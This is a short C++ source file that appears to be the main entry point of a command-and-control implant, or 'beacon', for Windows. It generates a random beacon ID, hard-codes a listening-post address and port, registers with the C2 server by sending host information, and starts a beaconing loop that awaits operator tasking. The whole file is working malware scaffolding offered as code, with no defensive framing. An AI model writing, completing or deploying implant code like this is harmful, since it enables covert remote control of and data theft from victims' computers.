#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#endif

#pragma comment(lib,"Shlwapi.lib")
#pragma comment(lib, "wldap32.lib")
#pragma comment(lib, "CRYPT32.LIB") // We needed to include the following libs to compile our exe properly with static libs

#include "implant.h"
#include "glob_id.h" // Our global variable for Beacon ID
#include <stdio.h>
#include <windows.h>
#include <tchar.h>
#include <boost/system/system_error.hpp>

extern std::string ids;

void rando_string(char* sStr, unsigned int iLen) // Generates new random string
{

    char Syms[] = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    unsigned int Ind = 0;
    srand(time(NULL) + rand());
    while (Ind < iLen)
    {
        sStr[Ind++] = Syms[rand() % 62];
    }
    sStr[iLen] = '\0';

}

//int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
int main()
{
    // Generates UUID for beacon
    char beaconID[100];
    rando_string(beaconID, 8);
    ids = beaconID;

    // Specify address, port and URI of listening post endpoint
    const auto host = "192.168.1.3";
    const auto port = "5000";
    const auto uri = "/results/" + ids;

    // Instantiate our implant object
    Implant implant{ host, port, uri };

    // When our beacon gets executed first time it will send some info to C2
    implant.beaconCheckIn("/reg");

    // Call the beacon method to start beaconing loop
    try {
        implant.beacon();
    }
    catch (const boost::system::system_error& se) {
        printf("\nSystem error: %s\n", se.what());
    }
}